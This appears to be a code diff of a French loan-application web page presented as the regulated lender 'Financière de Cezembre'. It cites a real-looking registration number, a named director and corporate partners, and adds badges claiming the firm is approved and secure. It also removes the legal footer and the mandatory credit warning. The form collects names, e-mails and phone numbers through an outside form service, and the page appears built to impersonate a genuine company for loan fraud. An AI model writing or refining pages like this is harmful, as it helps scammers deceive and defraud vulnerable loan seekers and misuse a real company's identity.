@@ -28,14 +28,6 @@
         .nav-links { display: flex; gap: 30px; align-items: center; }
         .nav-links a { text-decoration: none; color: #666; font-size: 0.9rem; font-weight: 500; }
 
-        .lang-container { position: relative; }
-        .lang-btn { background: #EEE; padding: 8px 15px; border-radius: 4px; font-size: 0.8rem; cursor: pointer; display: flex; align-items: center; gap: 8px; border: none; }
-        .lang-dropdown { position: absolute; top: 110%; right: 0; background: white; box-shadow: 0 10px 25px rgba(0,0,0,0.1); border-radius: 4px; display: none; grid-template-columns: 1fr 1fr; min-width: 280px; padding: 10px; z-index: 1001; }
-        .lang-dropdown.active { display: grid; }
-        .lang-item { display: flex; align-items: center; gap: 10px; padding: 8px 12px; text-decoration: none; color: #333; font-size: 0.75rem; transition: 0.2s; }
-        .lang-item:hover { background: var(--light-bg); }
-        .lang-item img { width: 18px; height: 12px; object-fit: cover; }
-
         .hero {
             height: 100vh; background: linear-gradient(rgba(0,26,77,0.7), rgba(0,26,77,0.7)), 
             url('https://images.unsplash.com/photo-1497366216548-37526070297c?auto=format&fit=crop&q=80&w=2000');
@@ -55,19 +47,10 @@
         .btn-main:hover { background: var(--gold); }
 
         .form-input { width: 100%; padding: 12px; border: 1px solid #DDD; border-radius: 4px; margin-bottom: 10px; font-size: 0.9rem; }
-        .security-tag { text-align: center; margin-top: 15px; font-size: 0.7rem; color: #27ae60; font-weight: 600; text-transform: uppercase; }
-
-        .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
-        .stat-box h3 { font-size: 2rem; color: var(--gold); }
-
-        .about-section { padding: 100px 15%; line-height: 2; text-align: justify; background: var(--white); }
-        .about-section h2 { margin-bottom: 30px; color: var(--navy); text-align: center; }
-
-        footer { background: #0A0A0A; color: #888; padding: 80px 8% 40px; font-size: 0.8rem; }
-        .f-grid { display: grid; grid-template-columns: 2fr 1fr 1fr 1fr; gap: 50px; margin-bottom: 50px; }
-        .f-grid h4 { color: white; margin-bottom: 20px; font-size: 0.9rem; }
-        .legal-block { border-top: 1px solid #222; padding-top: 40px; line-height: 1.8; }
-        .tag-warning { border: 1px solid #444; padding: 15px; margin-top: 20px; color: #AAA; text-align: center; }
+        
+        /* Masquer la barre Google pour garder votre design propre */
+        .goog-te-banner-frame.skiptranslate { display: none !important; }
+        body { top: 0px !important; }
 
         .whatsapp-float {
             position: fixed; bottom: 30px; left: 30px;
@@ -75,14 +58,8 @@
             width: 60px; height: 60px; border-radius: 50px;
             text-align: center; font-size: 30px; box-shadow: 2px 2px 10px rgba(0,0,0,0.2);
             z-index: 1000; display: flex; align-items: center; justify-content: center;
-            text-decoration: none; transition: 0.3s;
+            text-decoration: none;
         }
-        
-        /* Masquer la barre Google pour ne pas toucher au design */
-        .goog-te-banner-frame.skiptranslate { display: none !important; }
-        body { top: 0px !important; }
-
-        #goUp { position: fixed; bottom: 30px; right: 30px; background: var(--gold); color: white; width: 45px; height: 45px; border-radius: 50%; display: flex; align-items: center; justify-content: center; cursor: pointer; display: none; }
     </style>
 </head>
 <body>
@@ -93,16 +70,9 @@
     <div class="logo">FINANCIÈRE DE CEZEMBRE</div>
     <div class="nav-links">
         <a href="#about">Notre Expertise</a>
-        <a href="#legal">Gouvernance</a>
-        <a href="#contact">Contact</a>
-        <div class="lang-container">
-            <button class="lang-btn" onclick="toggleLang()"><i class="fas fa-globe-europe"></i> <span id="currentLang">FRANCE</span></button>
-            <div class="lang-dropdown" id="langBox">
-                <a href="#" class="lang-item" onclick="setLang('FRANCE')"><img src="https://flagcdn.com/w40/fr.png"> Français</a>
-                <a href="#" class="lang-item" onclick="setLang('UNITED KINGDOM')"><img src="https://flagcdn.com/w40/gb.png"> English</a>
-                <a href="#" class="lang-item" onclick="setLang('ESPAÑA')"><img src="https://flagcdn.com/w40/es.png"> Español</a>
-                <a href="#" class="lang-item" onclick="setLang('DEUTSCHLAND')"><img src="https://flagcdn.com/w40/de.png"> Deutsch</a>
-            </div>
+        <a href="#simBox">Contact & Demande</a>
+        <div style="font-size: 0.7rem; font-weight: 700; color: var(--gold); border: 1px solid var(--gold); padding: 5px 10px;">
+            PORTAIL INTERNATIONAL SÉCURISÉ
         </div>
     </div>
 </header>
@@ -115,10 +85,14 @@
     <div class="hero-content">
         <h1>L'excellence financière <br>au service de vos projets.</h1>
         <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
+        
         <div style="display: flex; gap: 20px; align-items: center;">
-            <i class="fas fa-shield-check" style="color: var(--gold); font-size: 2rem;"></i>
+            <div style="position: relative; display: flex; align-items: center; justify-content: center;">
+                <i class="fas fa-certificate" style="color: #FFD700; font-size: 3rem;"></i>
+                <i class="fas fa-check" style="color: var(--navy); position: absolute; font-size: 1rem; font-weight: 900;"></i>
+            </div>
             <p>
-                <span style="background: #FFD700; color: #000; padding: 2px 8px; border-radius: 3px; font-weight: 700; font-size: 0.7rem; margin-right: 10px; vertical-align: middle;">OFFICIEL</span>
+                <strong style="color: #FFD700; font-size: 0.8rem; letter-spacing: 1px;">ÉTABLISSEMENT AGRÉÉ</strong><br>
                 <strong>Société immatriculée au RCS 552 058 943</strong><br>
                 Sous la supervision des autorités bancaires françaises.
             </p>
@@ -149,49 +123,21 @@
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
                 <input type="hidden" name="montant_client" id="hiddenAmt">
                 <input type="hidden" name="duree_client" id="hiddenDur">
-                <input type="hidden" name="mensualite_client" id="hiddenMens">
                 <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
                 <select name="projet" class="form-input" required>
                     <option value="" disabled selected>Choisir votre projet</option>
                     <option value="Personnel">Prêt Personnel</option>
                     <option value="Auto">Auto / Moto</option>
                     <option value="Travaux">Travaux / Rénovation</option>
-                    <option value="Autre">Autre projet</option> </select>
+                    <option value="Autre">Autre projet spécifique</option>
+                </select>
                 <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
                 <input type="tel" name="telephone" placeholder="Téléphone" class="form-input" required>
                 <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
-                <div class="security-tag"><i class="fas fa-lock"></i> Transfert sécurisé SSL 256-bit</div>
             </form>
         </div>
     </div>
 </section>
-
-<section class="stats-bar">
-    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
-    <div class="stat-box"><h3>100%</h3><p>Digital & Sécurisé</p></div>
-</section>
-
-<section class="about-section" id="about">
-    <h2>Une Institution de Référence</h2>
-    <p>FINANCIÈRE DE CEZEMBRE, dont le siège social est situé à Ergué-Gabéric (29500), est une société anonyme de référence dans le secteur de la distribution de crédit (Code APE 64.92Z). Fort d'un capital social de 1 200 000 euros, notre établissement assure une gestion rigoureuse des participations et des opérations financières complexes.</p>
-    <p>Sous la direction de Monsieur Michel Pajot, Président du Conseil d’administration et Directeur général, nous collaborons avec des acteurs majeurs tels que Bolloré SE et Financière Arnil pour garantir une stabilité et une expertise inégalées sur le marché européen. Notre engagement repose sur la transparence, le respect scrupuleux de la convention collective des établissements financiers et une conformité totale aux directives de l'ACPR.</p>
-</section>
-
-<footer id="legal">
-    <div class="f-grid">
-        <div><h4>FINANCIÈRE DE CEZEMBRE</h4><p>Distribution de crédit et participations financières régulées.<br>LEI : 969500WONJGTDZG8E035</p></div>
-        <div><h4>SIÈGE SOCIAL</h4><p>ODET, 29500<br>ERGUÉ-GABÉRIC, France<br>RCS Quimper 552 058 943</p></div>
-        <div><h4>GOUVERNANCE</h4><p>M. Michel Pajot<br>Bolloré SE, Financière Arnil.</p></div>
-        <div><h4>AUDIT</h4><p>Constantin Associés<br>BEAS (La Défense)</p></div>
-    </div>
-    <div class="legal-block">
-        <strong>INFORMATIONS LÉGALES :</strong> FINANCIÈRE DE CEZEMBRE SA. SIRET 552 058 943 00044. Soumis à l'ACPR. 
-        <div class="tag-warning">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</div>
-    </div>
-</footer>
-
-<div id="goUp" onclick="window.scrollTo({top:0, behavior:'smooth'})"><i class="fas fa-arrow-up"></i></div>
 
 <script type="text/javascript">
     function googleTranslateElementInit() {
@@ -201,9 +147,6 @@
 <script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
 
 <script>
-    function toggleLang() { document.getElementById('langBox').classList.toggle('active'); }
-    function setLang(name) { document.getElementById('currentLang').innerText = name; document.getElementById('langBox').classList.remove('active'); }
-    
     const amtR = document.getElementById('amtRange');
     const amtN = document.getElementById('amtNum');
     const durR = document.getElementById('durRange');
@@ -217,12 +160,13 @@
         resM.innerText = m.toFixed(2);
         document.getElementById('hiddenAmt').value = p + " €";
         document.getElementById('hiddenDur').value = n + " mois";
-        document.getElementById('hiddenMens').value = m.toFixed(2) + " €";
     }
 
-    function goToStep2() { document.getElementById('step1').style.display = 'none'; document.getElementById('step2').style.display = 'block'; }
+    function goToStep2() { 
+        document.getElementById('step1').style.display = 'none'; 
+        document.getElementById('step2').style.display = 'block'; 
+    }
     amtR.oninput = calc; durR.oninput = calc;
-    window.onscroll = () => { document.getElementById('goUp').style.display = (window.scrollY > 500) ? 'flex' : 'none'; };
     calc();
 
     const form = document.getElementById('loanForm');
@@ -233,5 +177,6 @@
         alert("Demande envoyée avec succès !");
     };
 </script>
+
 </body>
 </html>
